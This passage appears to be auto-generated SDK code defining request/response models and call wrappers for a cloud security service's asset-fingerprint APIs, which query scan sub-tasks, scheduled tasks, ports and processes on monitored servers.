    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='16'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeOnceTaskLeafRecordPageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeOnceTaskLeafRecordPageResponseBody(name='body'),
}

/**
 * @summary Queries the sub-task information of one-time scan task. A sub-task can be an image scan task or an image asset synchronization task.
 *
 * @param request DescribeOnceTaskLeafRecordPageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeOnceTaskLeafRecordPageResponse
 */
async function describeOnceTaskLeafRecordPageWithOptions(request: DescribeOnceTaskLeafRecordPageRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskLeafRecordPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.relateInfo)) {
    query['RelateInfo'] = request.relateInfo;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTaskLeafRecordPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the sub-task information of one-time scan task. A sub-task can be an image scan task or an image asset synchronization task.
 *
 * @param request DescribeOnceTaskLeafRecordPageRequest
 * @return DescribeOnceTaskLeafRecordPageResponse
 */
async function describeOnceTaskLeafRecordPage(request: DescribeOnceTaskLeafRecordPageRequest): DescribeOnceTaskLeafRecordPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskLeafRecordPageWithOptions(request, runtime);
}

model DescribePropertyCountRequest {
  type?: string(name='Type', description='The type of the asset fingerprints. Separate multiple types with commas (,). Valid values:

*   **port**: port
*   **process**: process
*   **software**: software
*   **user**: account
*   **cron**: scheduled task
*   **sca**: middleware
*   **web**: website
*   **database**: database
*   **lkm**: kernel module
*   **autorun**: startup item
*   **web_server**: web service', example='port,process'),
  uuidList?: string(name='UuidList', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='9658314a-7609-4426-afc4-2c924072****,
9658314a-7609-4426-afc4-2c924072****'),
}

model DescribePropertyCountResponseBody = {
  autorun?: int32(name='Autorun', description='The number of startup items.', example='3'),
  cron?: int32(name='Cron', description='The number of scheduled tasks.', example='123'),
  database?: int32(name='Database', description='The number of databases.', example='2'),
  lkm?: int32(name='Lkm', description='The number of kernel modules.', example='4'),
  port?: int32(name='Port', description='The number of ports.', example='22'),
  process?: int32(name='Process', description='The number of processes.', example='367'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  sca?: int32(name='Sca', description='The number of middleware assets.', example='112'),
  software?: int32(name='Software', description='The number of software assets.', example='111'),
  user?: int32(name='User', description='The number of accounts.', example='214'),
  web?: int32(name='Web', description='The number of websites.', example='65'),
  webserver?: int32(name='Webserver', description='The number of web services.', example='8'),
}

model DescribePropertyCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyCountResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of asset fingerprints. The assets include processes, ports, software, accounts, middleware, websites, web services, scheduled tasks, startup items, and databases.
 *
 * @param request DescribePropertyCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyCountResponse
 */
async function describePropertyCountWithOptions(request: DescribePropertyCountRequest, runtime: Util.RuntimeOptions): DescribePropertyCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of asset fingerprints. The assets include processes, ports, software, accounts, middleware, websites, web services, scheduled tasks, startup items, and databases.
 *
 * @param request DescribePropertyCountRequest
 * @return DescribePropertyCountResponse
 */
async function describePropertyCount(request: DescribePropertyCountRequest): DescribePropertyCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCountWithOptions(request, runtime);
}

model DescribePropertyCronDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by path to the scheduled task is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  source?: string(name='Source', description='The path to the scheduled task.', example='/etc/cron.d/root'),
  user?: string(name='User', description='The username of the account that runs the scheduled task.', example='root'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyCronDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      cmd?: string(name='Cmd', description='The command that is used to run the scheduled task.', example='/usr/lib64/sa/sa1 1 1'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      md5?: string(name='Md5', description='The MD5 hash value of the path to the scheduled task.', example='4cc8f97c2bf9cbabb2c2be2erqw****'),
      period?: string(name='Period', description='The interval at which the scheduled task is performed.'),
      source?: string(name='Source', description='The path to the scheduled task.', example='/etc/cron.d/root'),
      user?: string(name='User', description='The username of the account that runs the scheduled task.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The details of the scheduled tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B0C4E12E-CCE1-109D-9E62-7B95CBBAEF8C'),
}

model DescribePropertyCronDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyCronDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of scheduled tasks on the Host page.
 *
 * @param request DescribePropertyCronDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyCronDetailResponse
 */
async function describePropertyCronDetailWithOptions(request: DescribePropertyCronDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyCronDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of scheduled tasks on the Host page.
 *
 * @param request DescribePropertyCronDetailRequest
 * @return DescribePropertyCronDetailResponse
 */
async function describePropertyCronDetail(request: DescribePropertyCronDetailRequest): DescribePropertyCronDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronDetailWithOptions(request, runtime);
}

model DescribePropertyCronItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  source?: string(name='Source', description='The path to the scheduled task.', example='/data'),
}

model DescribePropertyCronItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='11'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='11'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the scheduled task is run.', example='23'),
      source?: string(name='Source', description='The path to the scheduled task.', example='/data'),
    }
  ](name='PropertyItems', description='An array that consists of scheduled tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model DescribePropertyCronItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyCronItemResponseBody(name='body'),
}

/**
 * @summary Queries the scheduled tasks of your assets.
 *
 * @param request DescribePropertyCronItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyCronItemResponse
 */
async function describePropertyCronItemWithOptions(request: DescribePropertyCronItemRequest, runtime: Util.RuntimeOptions): DescribePropertyCronItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the scheduled tasks of your assets.
 *
 * @param request DescribePropertyCronItemRequest
 * @return DescribePropertyCronItemResponse
 */
async function describePropertyCronItem(request: DescribePropertyCronItemRequest): DescribePropertyCronItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronItemWithOptions(request, runtime);
}

model DescribePropertyPortDetailRequest {
  bindIp?: string(name='BindIp', description='The IP address bound to the port.', example='0.0.XX.XX'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by port number is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  port?: string(name='Port', description='The listening port of the server.', example='22'),
  procName?: string(name='ProcName', description='The name of the server process.', example='sshd'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyPortDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      bindIp?: string(name='BindIp', description='The IP address bound to the port.', example='0.0.X.X'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the network interface controller (NIC) that is bound to the listening port.', example='192.168.XX.XX'),
      pid?: string(name='Pid', description='The ID of the server process that listens on the port.', example='522'),
      port?: string(name='Port', description='The listener port.', example='22'),
      procName?: string(name='ProcName', description='The name of the server process.', example='sshd'),
      proto?: string(name='Proto', description='The network protocol that is used by the listening port.', example='tcp'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The fingerprints of the ports.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0FA7F1F4-488D-52CA-9BFC-3E47793B49D1'),
}

model DescribePropertyPortDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyPortDetailResponseBody(name='body'),
}

/**
 * @summary Queries the fingerprints of ports on a specified server.
 *
 * @param request DescribePropertyPortDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyPortDetailResponse
 */
async function describePropertyPortDetailWithOptions(request: DescribePropertyPortDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyPortDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bindIp)) {
    query['BindIp'] = request.bindIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.procName)) {
    query['ProcName'] = request.procName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the fingerprints of ports on a specified server.
 *
 * @param request DescribePropertyPortDetailRequest
 * @return DescribePropertyPortDetailResponse
 */
async function describePropertyPortDetail(request: DescribePropertyPortDetailRequest): DescribePropertyPortDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortDetailWithOptions(request, runtime);
}

model DescribePropertyPortItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='5'),
  port?: string(name='Port', description='The port number.', example='22'),
}

model DescribePropertyPortItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='163'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers that use the port.', example='495'),
      port?: string(name='Port', description='The number of the listening port.', example='22'),
      proto?: string(name='Proto', description='The network protocol of the port.', example='tcp'),
    }
  ](name='PropertyItems', description='An array that consists of the ports returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribePropertyPortItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyPortItemResponseBody(name='body'),
}

/**
 * @summary Queries information about all ports.
 *
 * @param request DescribePropertyPortItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyPortItemResponse
 */
async function describePropertyPortItemWithOptions(request: DescribePropertyPortItemRequest, runtime: Util.RuntimeOptions): DescribePropertyPortItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about all ports.
 *
 * @param request DescribePropertyPortItemRequest
 * @return DescribePropertyPortItemResponse
 */
async function describePropertyPortItem(request: DescribePropertyPortItemRequest): DescribePropertyPortItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortItemWithOptions(request, runtime);
}

model DescribePropertyProcDetailRequest {
  cmdline?: string(name='Cmdline', description='The startup parameter of the process.', example='./8888'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by process name is supported. If you want to use fuzzy search, set the parameter to 1. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  name?: string(name='Name', description='The name of the process.', example='8888'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  procTimeEnd?: long(name='ProcTimeEnd', description='The timestamp when the process ends. Unit: milliseconds.', example='1649587453000'),
  procTimeStart?: long(name='ProcTimeStart', description='The timestamp when the process starts. Unit: milliseconds.', example='1648809853000'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the account ID.', example='127608589417****'),
  user?: string(name='User', description='The user who runs the process.', example='root'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyProcDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      cmdline?: string(name='Cmdline', description='The startup parameter of the process.', example='./8888'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of last data collection. Unit: milliseconds.', example='1565686951000'),
      euidName?: string(name='EuidName', description='The permission that is required to run the process.', example='root'),
      instanceId?: string(name='InstanceId', description='The ID of the server that is associated with the process.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server that is associated with the process.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      isPackage?: int32(name='IsPackage', description='Indicates whether the process is a package installation process. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
      md5?: string(name='Md5', description='The MD5 hash value of the process file.', example='842644ea3d88bd7f7e14c1c089ef****'),
      name?: string(name='Name', description='The name of the process.', example='agetty'),
      path?: string(name='Path', description='The path of the process.'),
      pid?: string(name='Pid', description='The ID of the process.', example='12826'),
      pname?: string(name='Pname', description='The name of the parent process to which the process belongs.', example='start***.s'),
      startTime?: string(name='StartTime', description='The time when the process starts.', example='2019-08-07 10:09:05'),
      startTimeDt?: long(name='StartTimeDt', description='The timestamp when the process starts. Unit: milliseconds.', example='1648783107000'),
      state?: string(name='State', description='The status of the process.', example='sleeping'),
      user?: string(name='User', description='The user who runs the process.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server that is associated with the process.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='An array that consists of the fingerprints of the processes.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AA47D46F-10DE-138C-BBB4-8A0003F75CD7'),
}

model DescribePropertyProcDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyProcDetailResponseBody(name='body'),
}

/**
 * @summary Queries the fingerprints of processes on a specified server.
 *
 * @param request DescribePropertyProcDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyProcDetailResponse
 */
async function describePropertyProcDetailWithOptions(request: DescribePropertyProcDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyProcDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.procTimeEnd)) {
    query['ProcTimeEnd'] = request.procTimeEnd;
  }
  if (!Util.isUnset(request.procTimeStart)) {
    query['ProcTimeStart'] = request.procTimeStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the fingerprints of processes on a specified server.
 *
 * @param request DescribePropertyProcDetailRequest
 * @return DescribePropertyProcDetailResponse
 */
async function describePropertyProcDetail(request: DescribePropertyProcDetailRequest): DescribePropertyProcDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcDetailWithOptions(request, runtime);
}

model DescribePropertyProcItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true'),
  name?: string(name='Name', description='The name of the process.', example='test'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
}

model DescribePropertyProcItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='372'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the process runs.', example='8888'),
      name?: string(name='Name', description='The name of the process.', example='.ss'),
    }
  ](name='PropertyItems', description='An array that consists of the processes returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='BD8AD4C6-A169-4FA3-BA1F-ED40ED52973B'),
}

model DescribePropertyProcItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyProcItemResponseBody(name='body'),
}

/**
 * @summary Queries information about all processes.
 *
 * @param request DescribePropertyProcItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyProcItemResponse
 */
async function describePropertyProcItemWithOptions(request: DescribePropertyProcItemRequest, runtime: Util.RuntimeOptions): DescribePropertyProcItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about all processes.
 *
 * @param request DescribePropertyProcItemRequest
 * @return DescribePropertyProcItemResponse
 */
async function describePropertyProcItem(request: DescribePropertyProcItemRequest): DescribePropertyProcItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcItemWithOptions(request, runtime);
}

model DescribePropertyScaDetailRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **sca**: middleware
*   **sca_database**: database
*   **sca_web**: web service

>  If you do not specify this parameter, the default value **sca** is used, which indicates that middleware fingerprints are queried.', example='sca'),
  bizType?: string(name='BizType', description='The type of the middleware, database, or web service that you want to query. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='system_service'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
